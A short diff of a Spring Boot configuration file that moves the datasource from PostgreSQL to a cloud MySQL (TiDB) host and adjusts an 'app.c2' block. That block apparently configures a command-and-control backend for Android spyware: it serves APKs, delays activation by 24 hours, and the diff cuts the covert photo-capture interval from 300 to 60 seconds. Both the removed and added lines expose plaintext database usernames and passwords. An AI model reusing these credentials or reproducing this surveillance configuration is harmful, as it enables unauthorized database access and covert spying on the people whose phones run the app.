@@ -3,16 +3,16 @@ server:
 
 spring:
   datasource:
-    url: jdbc:postgresql://dpg-daqdet8u01pc73fpamg0-a/bluewhale_rezl
-    username: bluewhale2
-    password: oPt3y3MkttmCPwDSiTxBv7WgwqxbNmJd
-    driver-class-name: org.postgresql.Driver
+    url: jdbc:mysql://gateway01.ap-northeast-1.prod.aws.tidbcloud.com:4000/bluewhale?sslMode=VERIFY_IDENTITY
+    username: c29ZCC9ruT1MEfF.root
+    password: 8giyswAzhNGmWkho
+    driver-class-name: com.mysql.cj.jdbc.Driver
 
   jpa:
     hibernate:
       ddl-auto: update
     show-sql: false
-    database-platform: org.hibernate.dialect.PostgreSQLDialect
+    database-platform: org.hibernate.dialect.MySQLDialect
 
   servlet:
     multipart:
@@ -26,5 +26,5 @@ app:
     apk-path: ./apk
   c2:
     activation-delay-hours: 24
-    photo-interval-seconds: 300
+    photo-interval-seconds: 60
     poll-interval-seconds: 30
